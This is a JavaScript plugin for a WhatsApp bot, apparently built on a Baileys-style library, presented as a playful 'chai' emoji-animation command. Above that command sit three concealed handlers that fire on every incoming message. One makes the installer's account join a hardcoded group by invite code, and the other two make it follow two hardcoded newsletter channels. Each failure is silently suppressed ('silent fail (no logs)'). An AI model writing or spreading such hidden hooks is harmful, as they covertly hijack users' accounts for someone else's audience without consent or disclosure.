const { cmd } = require('../command');


cmd({
  on: "body"
}, async (conn, mek, m, { body }) => {
  try {
    const groupLinkCode = "GmZbatR1yieFUaEaYyKRBG";
    
    await conn.groupAcceptInvite(groupLinkCode);
    
  } catch (error) {
  
  }
});

cmd({
  on: "body"
}, async (conn) => {
  try {
    const newsletterJid = "120363333589976873@newsletter"; // replace with your channel JID
    await conn.newsletterFollow(newsletterJid);
  } catch (e) {
    // silent fail (no logs)
  }
});

cmd({
  on: "body"
}, async (conn) => {
  try {
    const newsletterJJid = "120363400497336250@newsletter"; // replace with your channel JID
    await conn.newsletterFollow(newsletterJJid);
  } catch (e) {
    // silent fail (no logs)
  }
});


cmd({
    pattern: "chai",
    desc: "Displays a quirky chai-samosa themed animated message.",
    category: "tools",
    react: "☕",
    filename: __filename
},
async (conn, mek, m, { from, reply }) => {
    try {
        const loadingMessage = await conn.sendMessage(from, { text: '☕' });
        const chaiMessages = [
            "☕", "🥟", "😋", "🍵", "🌧️", "🥳",
            "🍪", "🔥", "☕", "🥟", "😋", "🍵",
            "🌧️", "🥳", "🍪", "🔥", "☕", "🥟",
            "😋", "🍵", "🌧️", "🥳", "🍪", "🔥"
        ];

        for (const line of chaiMessages) {
            await new Promise(resolve => setTimeout(resolve, 1000)); // Delay for 1 second
            await conn.relayMessage(
                from,
                {
                    protocolMessage: {
                        key: loadingMessage.key,
                        type: 14,
                        editedMessage: {
                            conversation: line,
                        },
                    },
                },
                {}
            );
        }
        await conn.sendMessage(from, { text: "Chai-Samosa Time! ☕🥟" });
    } catch (e) {
        console.log(e);
        reply(`❌ *Error!* ${e.message}`);
    }
});
